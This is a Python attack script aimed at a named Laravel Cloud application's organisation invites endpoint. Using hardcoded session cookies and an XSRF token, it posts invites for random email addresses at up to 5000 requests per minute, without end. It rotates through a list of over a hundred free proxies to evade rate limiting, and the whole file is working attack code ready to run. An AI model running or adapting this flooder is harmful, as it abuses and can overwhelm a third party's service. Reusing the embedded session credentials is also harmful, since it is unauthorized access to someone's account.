import requests
import string
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor

url = "https://exaba-one-alpha.laravel.cloud/o/0198c158-bda2-71d2-9b93-3eaf042f1012/invites"

cookies = {
    "sidebar_state": "true",
    "remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d": "eyJpdiI6ImltdndMY204Vk83WjcvakpJWlBlNEE9PSIsInZhbHVlIjoiSjJ6WDUxRExZQ1VxZXRvTEprUERLaXpXQitYd3ppQy8ycjZrVWY1bllpNS80RTJ2TjZJQ21Wa0RXSUNhY0p2ZTVuRWFuVmVXUG1YSHVoK2s0aVBmSG5nYkI0UzEwSXduMUxsZmJrYnIxY1FkMUZ5SDJqQmJOYmFzZS93RDA5Q1dQM1M2QjRwMUZXeXl6akF4dUlPUmRQNW9ycVM0SitWZDBnenFRSU1DZitmcFRGYmtlZzVWYm5Jejk4ZW9sQ0lpQ09XY1ZvQ0R1ZVlVUzczQzNmSzNZWmlzMmxqbGlCeXkxQmR1OVFyRzlGQT0iLCJtYWMiOiI3ZTlkMzQzOTUyNDg1YzAyMDE3ZWIwYzYzYjUzNTlmZTBhNWI2ZGI0MzA1YTU2YTM5OGNjYjdlM2VmZmEyOTg2IiwidGFnIjoiIn0%3D",
    "SxyzZCl2i8QtnAoo37Fd2CwlI5mCy9FkYioMUEpy": "eyJpdiI6IisxQ0I1OUFtT2NFSXpWWm5sdDlseHc9PSIsInZhbHVlIjoiaVBiRWJoTGpscVVUUDBudnE2N1pNMjBWa3RxcFVqdndRTlh2eEU5M1RHYmxBd0ZtYlhtaUEyb3p2ZUtsUVRFS251WjhqMHBCRUxoVURzdjNGcTllQ01DL3h4RzhRUUk1VFRFYzNuamVMTVRPSk4ybEEwWUQyWFpoLzhYTU1Eb1dnWmRJMDJoQWVOWithVURFQ2d1UmhWcjFPU1ZyRlptMXhETDFwUzVvTHpvQndBa3c3WFVEeWM3Qmp1cU5yeWRrN0F3NkhoNWxJdCtmY2NxWHpZdS9NZ1UrbkVMUTNVTitJN3JuaWtLcEg5Sk9PSHYrQWl0eCtDNG0raEFFR1U4OTNiU3hMYWhiZ2hmSkJVSzF2dVlUYWxLNDM3VkZzWVU1Zk1qL0Y4WG0wREszR3h4QU5lMVY1K1lRalA0eXZ4bTFES09yR2w1ZU52aFQwdjExdWllQlBXRWJpd0ZyWUYxMUFScWw3d1RkeGQ4VlFabDhQaXVCVHZCeDgvRkVuTXplV0J4TDNwTi9JeWt4OXlXQklCTm9iVzM5UWdYdlZWS3VHOFR6dXZnOFU4eWk1UHhaZWdwcDNSM3BNc1h6VG1od2NlamRVQUV2QVVuRndOTEZDVXNzbnNQNjhGVDRqQmJFTHZFVjlZTVIwazg9IiwibWFjIjoiNWNiZGQ5NDcwMDZhNzFhYzQzYjgyOWVjZDdkYzU4NTZiY2YzMzA0YzIzNTkzODZlZjcxMTE1Y2U5MTZhMzY0MCIsInRhZyI6IiJ9",
    "XSRF-TOKEN": "eyJpdiI6IkE3eVBhTXBjTFl3dm80MnEwZUsrWVE9PSIsInZhbHVlIjoiblhnQzEzZmlIL2prQTlQMzBrQkhYVkNqcHNSWDFjZGdLMG9Ka3pVbXlWem02b2ZGa0ZlUnBJeGUrVmRKT21uZ29DYXBJMFpSQnNLN0dURWcrR3VndmxBeGgwdjFwMFFmNHhVYWNSVThkRWRiby9tSktHd2o1M0xZWlRYSE43MnMiLCJtYWMiOiI2YWZhZWQzMGEwMWYyNTlhNDg1NmU3ZGJkZGU0MTA1OGRiOWY3YjVlMDNmZGExYmJhOWYzOTRjZjQwZjBkZTI3IiwidGFnIjoiIn0%3D",
    "exaba_one_session": "eyJpdiI6IjM3YU9wQlZSODlxeWxjSmFEVUNkTEE9PSIsInZhbHVlIjoielcvTy9ESDRoNjNObDZmYlhhdEZNbWlMSXZTc0M0MHJCMSttR0tBNEdOOThYQWF5dnRqTmhXdlo3Wng4dmRVQVZzT2Zadk1NUEZwOTJ3Rkowa29kVmMrZ2hyT0VVUnpPZ0NpcnBWUlJrSWtMMHFGN0QvWXNPRTZXbHp2MVRiTFUiLCJtYWMiOiIwODc5Y2Q4MTJiYjUyNTVmYjNiOWY0MDM5ZGM5YjYwZTRlMWNiMzBmOWRmNDkyOTNiOTVmMDg4Y2I1N2FhZmI4IiwidGFnIjoiIn0%3D",
    "HGPVj31zg8kuKJNOgh5xmWE3p8jNvROzWlJGbPyT": "eyJpdiI6IjRCZSswU1dYNGEyaTJQTEVSSkt0SXc9PSIsInZhbHVlIjoiZnBIS0xLaUZsNnhNWkg5T3RML1hIZFdSSVZhcld2dmhMTHBrTWFUcThLVzV1Vi9HekNscTlDem5ndXlTTlZLelNDMjZBK2I2NWJJY3dwV2RJVTV4aVhkM3hqR0k5WUhuWHloMDRjWkNPSFdxY1RCQmYxOS9TOVk2ZGR4Y1VhOFlSUnhSZnB4Z2IwUCs3aVVZVmY5UDRJL3NDWnkwRENnM3VzcjY5UFlweXZRSFUzeDlORFhaNzAwNFpMT3ZjVHFJTENBYWovc3NTbS95ajlsTU56b0d5Q3hSTU5ZTk11RGFneEp3ak8xc2FxR1dJb2EreGRLeCtKR3NXU0grL3lySEVCa1dBZnl2RWkyOC9Pbm5iSE1yenliQWhzR01rSTFHTFVkK201dllLaHNrQjVTUjlGNW5DUGM0WGUxWXlOb1ZsQ2dBekpTTGNkYlBadFMweFBiZ2FIMW1JaCtObGFrZ05QSkcyc0hreFd4Y1MyalJkQzVOSHhRM2hWTHgzb0pmaDREMTZ5Z2k2RE5SbmVUVjNKWlZxMk1UVDhtTXBzMW9mWXVzaGtHaXhKdHgxNUNNeHpDWTNJMXl3bjkvNWtxU0VIYTU4VVZ0NTlLaXdraWoxUDZmbHM4WkFydCs5L3h0NDR3dDNPbzF4U1ZrWi9rRDI3UHlBNTF3akFpdVBxL3NzZFFoRW1XVnZNVytSdjRndkhXa1pRUzdjMTJmdUNOQWx1QlhNelVKYmVVPSIsIm1hYyI6IjAyZjU4NjlmNDRjZTY4NmZmMjBlNWI2MDRhODI2MmIzNDhiMzYzN2Q2ZWRlMzU0ZTFkM2JlM2Q1MDY3YzczYWUiLCJ0YWciOiIifQ%3D%3D"
}

headers = {
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "X-Xsrf-Token": "eyJpdiI6IkE3eVBhTXBjTFl3dm80MnEwZUsrWVE9PSIsInZhbHVlIjoiblhnQzEzZmlIL2prQTlQMzBrQkhYVkNqcHNSWDFjZGdLMG9Ka3pVbXlWem02b2ZGa0ZlUnBJeGUrVmRKT21uZ29DYXBJMFpSQnNLN0dURWcrR3VndmxBeGgwdjFwMFFmNHhVYWNSVThkRWRiby9tSktHd2o1M0xZWlRYSE43MnMiLCJtYWMiOiI2YWZhZWQzMGEwMWYyNTlhNDg1NmU3ZGJkZGU0MTA1OGRiOWY3YjVlMDNmZGExYmJhOWYzOTRjZjQwZjBkZTI3IiwidGFnIjoiIn0=",
    "X-Inertia-Version": "274bf03904694ab955cbaff0e05a833d",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
    "X-Inertia": "true",
    "Sec-Ch-Ua-Mobile": "?0",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Accept": "text/html, application/xhtml+xml",
    "Content-Type": "application/json",
    "Origin": "https://exaba-one-alpha.laravel.cloud",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://exaba-one-alpha.laravel.cloud/o/0198c158-bda2-71d2-9b93-3eaf042f1012/members",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i"
}

per_minute = 5000  # requests per minute
rotate_every = 10  # change proxy every 10 requests

proxy_list = [
    "179.96.28.58:80",
    "113.192.12.79:3030",
    "103.99.201.221:1452",
    "113.192.12.84:3030",
    "14.231.148.140:1452",
    "103.159.104.67:1452",
    "161.35.70.249:8080",
    "176.126.103.194:44214",
    "213.233.178.137:3128",
    "57.129.81.201:8080",
    "159.69.57.20:8880",
    "51.79.99.237:4502",
    "38.147.98.190:8080",
    "66.36.234.130:1339",
    "154.62.226.126:8888",
    "209.97.150.167:8080",
    "159.203.61.169:3128",
    "36.77.233.219:8080",
    "94.156.112.198:3128",
    "83.222.184.90:3128",
    "83.222.184.87:3128",
    "201.144.20.238:3128",
    "103.171.31.11:8080",
    "34.88.57.53:3128",
    "103.126.87.181:7777",
    "45.175.155.17:999",
    "112.198.18.206:8080",
    "138.0.143.120:8080",
    "189.50.9.30:8080",
    "77.110.114.19:8118",
    "200.125.168.56:999",
    "49.146.154.43:8082",
    "103.172.35.64:8080",
    "157.10.3.10:8080",
    "190.52.107.85:999",
    "38.159.229.139:999",
    "116.99.7.210:4001",
    "196.251.223.29:8104",
    "103.154.152.104:2020",
    "103.193.144.223:8080",
    "85.117.63.37:8080",
    "222.127.55.155:8082",
    "36.95.245.7:8090",
    "167.172.253.162:4857",
    "196.216.134.71:8865",
    "223.135.156.183:8080",
    "103.106.219.171:8081",
    "142.93.209.163:3128",
    "157.66.84.17:8080",
    "124.6.51.226:8099",
    "197.248.201.97:8080",
    "103.99.136.66:8080",
    "103.148.112.245:60080",
    "27.79.246.238:16000",
    "103.112.53.211:6314",
    "176.88.168.105:8080",
    "31.193.193.69:1488",
    "41.254.48.66:1981",
    "34.124.254.47:8888",
    "188.166.197.129:3128",
    "38.7.131.198:999",
    "203.162.13.26:6868",
    "42.118.3.129:16000",
    "145.40.96.157:9401",
    "42.118.24.188:16000",
    "91.84.99.28:80",
    "139.59.228.95:8118",
    "98.154.21.253:4228",
    "84.247.188.39:8888",
    "51.159.159.73:80",
    "181.57.131.122:8080",
    "103.41.250.97:8080",
    "122.52.213.79:62102",
    "129.146.167.15:3128",
    "201.88.213.118:8080",
    "15.204.151.144:31158",
    "143.208.57.162:999",
    "103.191.171.130:1452",
    "103.164.214.122:8080",
    "103.171.83.49:8080",
    "103.133.26.45:8080",
    "103.156.224.66:8080",
    "45.167.125.21:999",
    "176.213.141.107:8080",
    "103.175.236.221:3125",
    "157.20.244.77:8080",
    "91.196.77.190:8080",
    "45.170.130.240:999",
    "103.167.156.25:8083",
    "103.152.238.84:1080",
    "120.28.214.157:8080",
    "158.178.214.173:3138",
    "91.214.31.234:8080",
    "43.246.200.73:8888",
    "103.63.26.123:8080",
    "118.136.37.139:8080",
    "186.96.180.17:999",
    "222.127.55.214:5050",
    "200.39.152.161:999",
    "190.108.82.244:999",
    "45.115.113.182:4334",
    "203.189.96.232:80",
    "109.74.132.178:8080",
    "113.160.224.236:1452",
    "152.53.168.53:44887",
    "43.252.237.111:1111",
    "176.9.238.155:16379",
    "45.174.110.5:999",
    "176.88.175.202:8080",
    "139.59.1.14:80",
    "179.1.143.66:9992",
    "178.207.11.148:3129",
    "103.155.196.158:8080",
    "1.52.197.170:16000",
    "200.125.171.77:9991",
    "196.204.83.235:1981",
    "1.52.198.121:16000",
    "91.121.208.196:5062",
    "47.79.94.34:1122",
    "85.133.240.75:8080",
    "161.35.70.249:8080",
    "66.36.234.130:1339",
    "14.235.22.8:8080",
    "139.162.78.109:3128",
    "200.174.198.86:8888",
    "139.162.78.109:8080",
    "159.69.57.20:8880",
    "176.126.103.194:44214",
    "159.203.61.169:3128",
    "14.235.22.8:8080",
    "51.79.99.237:4502",
    "38.147.98.190:8080"
]

# Get proxies from here or other places
# https://free-proxy-list.net/en/
# https://advanced.name/freeproxy

# ---------------------------------------

lock = threading.Lock()
total_requests = 0
working_proxies = []

def random_email(length=78):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + "@mail.com"

def test_proxy(proxy):
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=1)
        if r.status_code == 200:
            return proxy
    except:
        return None

def get_working_proxies(proxy_list):
    print("Testing proxies...")
    working = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        results = executor.map(test_proxy, proxy_list)
        for r in results:
            if r:
                print(f"Working proxy: {r}")
                working.append(r)
    print(f"Total working proxies: {len(working)}")
    return working

def send_request(i, proxy=None):
    global total_requests
    data = {"email": random_email(), "role": "member"}
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    try:
        requests.post(url, headers=headers, cookies=cookies, json=data, proxies=proxies, timeout=2)
        with lock:
            total_requests += 1
            print(f"[{i}] Sent -> {data['email']} | Total: {total_requests} | Proxy: {proxy}")
    except:
        with lock:
            print(f"[{i}] Failed request via {proxy}")

def run_forever(per_minute=50):
    global working_proxies
    working_proxies = get_working_proxies(proxy_list)
    if not working_proxies:
        print("No working proxies found! Exiting.")
        return

    interval = 60 / per_minute
    i = 0
    while True:
        i += 1
        proxy = working_proxies[(i // rotate_every) % len(working_proxies)]
        threading.Thread(target=send_request, args=(i, proxy)).start()
        time.sleep(interval)

if __name__ == "__main__":
    run_forever(per_minute=per_minute)